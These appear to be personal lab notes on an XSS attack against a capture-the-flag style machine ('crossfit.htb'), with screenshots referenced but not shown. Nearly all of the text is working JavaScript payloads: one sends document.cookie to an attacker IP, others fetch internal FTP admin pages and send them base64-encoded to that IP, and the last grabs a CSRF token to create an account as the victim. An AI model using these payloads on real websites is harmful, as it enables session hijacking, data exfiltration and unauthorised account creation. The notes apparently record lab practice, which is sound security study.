## Gym-Club XSS Attack
### Detection
Upon sending XSS payload to blog-single.php, this error is displayed.
![[Pasted image 20210401020308.png]]

### Initial POC
![[Pasted image 20210401021706.png]]

### Check browser
Did'nt return a cookie, but it did validate XSS injection was possible.
```javascript
document.location = 'http://10.10.14.48/' + document.cookie;
```

### Get FTP page
used XMLHttpRequest to return a page
```javascript
var target = 'http://ftp.crossfit.htb/';
var req1 = new XMLHttpRequest();
req1.open('GET', target, false);
req1.send();
var response = req1.responseText;

var req2 = new XMLHttpRequest();
req2.open('GET','http://10.10.14.48/' + btoa(response), true);
req2.send();
```

This one got the accounts page
```javascript
var target = 'http://ftp.crossfit.htb/accounts/create'
var req1 = new XMLHttpRequest();
req1.open('GET', target, false);
req1.send();
var response = req1.responseText;

var req2 = new XMLHttpRequest();
req2.open('GET','http://10.10.14.48/' + btoa(response), true);
req2.send();
```

### Creating a User
Grabs token on /accounts/create to create an account
```javasscript
var target = 'http://ftp.crossfit.htb/accounts/create'
var req1 = new XMLHttpRequest();
req1.open('GET', target, false);
req1.withCredentials = true;
req1.send();
var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response,"text/html");
var token = doc.getElementsByName('_token')[0].value;

var req2 = new XMLHttpRequest();
var params = "username=clarkey&pass=123456&_token=" + token;
req2.open('POST','http://ftp.crossfit.htb/accounts', false);
req2.withCredentials = true;
req2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
req2.send(params);
var response2 = req2.responseText;



var req3 = new XMLHttpRequest();
req3.open('GET','http://10.10.14.48/' + btoa(response2), true);
req3.send();
```



